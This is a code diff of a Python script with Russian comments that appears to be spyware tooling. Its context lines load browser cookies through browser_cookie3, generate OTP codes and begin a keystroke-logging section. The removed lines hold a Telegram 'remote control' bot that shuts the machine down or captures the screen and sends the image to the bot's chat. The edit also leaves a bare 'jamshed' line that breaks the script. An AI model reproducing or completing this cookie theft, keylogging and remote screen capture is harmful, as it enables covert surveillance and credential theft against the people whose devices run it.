@@ -1,4 +1,4 @@
-# jamshed
+jamshed
 import requests
 from bs4 import BeautifulSoup
 import browser_cookie3
@@ -14,20 +14,6 @@ from threading import Timer
 from datetime import datetime
 
 
-# Получение профиля Instagram
-def get_instagram_profile(username):
-    url = f"https://www.instagram.com/{username}/"
-    response = requests.get(url)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    
-    # Пример извлечения данных
-    profile_name = soup.find("h1").text
-    followers = soup.find("meta", property="og:description")['content']
-    
-    return {
-        "profile_name": profile_name,
-        "followers": followers
-    }
 
 # Загрузка cookies из браузера
 def get_browser_cookies():
@@ -41,26 +27,7 @@ def generate_otp():
     otp_code = totp.now()
     print(f"Generated OTP: {otp_code}")
 
-# Telegram Bot
-def start_telegram_bot():
-    bot = telebot.TeleBot("YOUR_TELEGRAM_BOT_TOKEN")
 
-    @bot.message_handler(commands=['start'])
-    def send_welcome(message):
-        bot.reply_to(message, "Hello! I'm your remote control bot.")
-
-    @bot.message_handler(commands=['shutdown'])
-    def shutdown(message):
-        os.system("shutdown /s /t 1")  # Выключение устройства
-        bot.reply_to(message, "Shutting down...")
-
-    @bot.message_handler(commands=['screenshot'])
-    def screenshot(message):
-        os.system("screencapture screen.png")  # Создание скриншота (для macOS)
-        with open("screen.png", "rb") as photo:
-            bot.send_photo(message.chat.id, photo)
-
-    bot.polling()
 
 # Логирование клавиш
 log = ""
